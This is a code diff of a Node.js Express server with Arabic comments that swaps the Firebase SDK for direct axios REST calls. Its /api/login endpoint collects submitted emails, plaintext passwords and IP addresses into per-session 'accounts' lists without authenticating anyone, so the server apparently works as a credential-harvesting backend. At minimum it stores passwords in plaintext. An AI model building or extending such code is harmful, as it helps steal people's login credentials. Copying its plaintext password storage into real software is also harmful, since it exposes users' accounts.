@@ -23,13 +23,32 @@ const firebaseConfig = {
   measurementId: process.env.FIREBASE_MEASUREMENT_ID
 };
 
-// استخدام Firebase SDK العادي
-const { initializeApp } = require('firebase/app');
-const { getDatabase, ref, set, push, serverTimestamp } = require('firebase/database');
+// استخدام طريقة مبسطة للتعامل مع قاعدة البيانات
+const axios = require('axios');
 
-// تهيئة Firebase
-const firebaseApp = initializeApp(firebaseConfig);
-const database = getDatabase(firebaseApp, firebaseConfig.databaseURL);
+// دالة لتخزين البيانات في Firebase
+async function saveToFirebase(path, data) {
+  try {
+    const url = `${firebaseConfig.databaseURL}/${path}.json`;
+    await axios.put(url, data);
+    return true;
+  } catch (error) {
+    console.error('Error saving to Firebase:', error);
+    return false;
+  }
+}
+
+// دالة لإضافة بيانات جديدة إلى قائمة في Firebase
+async function pushToFirebase(path, data) {
+  try {
+    const url = `${firebaseConfig.databaseURL}/${path}.json`;
+    const response = await axios.post(url, data);
+    return response.data.name; // اسم المفتاح الجديد
+  } catch (error) {
+    console.error('Error pushing to Firebase:', error);
+    return null;
+  }
+}
 
 // API لإنشاء جلسة جديدة
 app.post('/api/create-session', async (req, res) => {
@@ -41,14 +60,17 @@ app.post('/api/create-session', async (req, res) => {
     }
     
     // إنشاء جلسة جديدة في Firebase
-    const sessionRef = ref(database, `login/sessions/${sessionId}`);
-    await set(sessionRef, {
-      created: serverTimestamp(),
+    const success = await saveToFirebase(`login/sessions/${sessionId}`, {
+      created: Date.now(),
       status: 'active',
       accounts: {}
     });
     
-    res.json({ success: true, sessionId });
+    if (success) {
+      res.json({ success: true, sessionId });
+    } else {
+      res.status(500).json({ error: 'حدث خطأ أثناء إنشاء الجلسة' });
+    }
   } catch (error) {
     console.error('Error creating session:', error);
     res.status(500).json({ error: 'حدث خطأ أثناء إنشاء الجلسة' });
@@ -65,16 +87,18 @@ app.post('/api/login', async (req, res) => {
     }
     
     // تخزين بيانات تسجيل الدخول في Firebase
-    const accountsRef = ref(database, `login/sessions/${sessionId}/accounts`);
-    const newAccountRef = push(accountsRef);
-    await set(newAccountRef, {
+    const accountKey = await pushToFirebase(`login/sessions/${sessionId}/accounts`, {
       email,
       password,
-      timestamp: serverTimestamp(),
+      timestamp: Date.now(),
       ip: ip || 'غير معروف'
     });
     
-    res.json({ success: true });
+    if (accountKey) {
+      res.json({ success: true });
+    } else {
+      res.status(500).json({ error: 'حدث خطأ أثناء تسجيل الدخول' });
+    }
   } catch (error) {
     console.error('Error logging in:', error);
     res.status(500).json({ error: 'حدث خطأ أثناء تسجيل الدخول' });
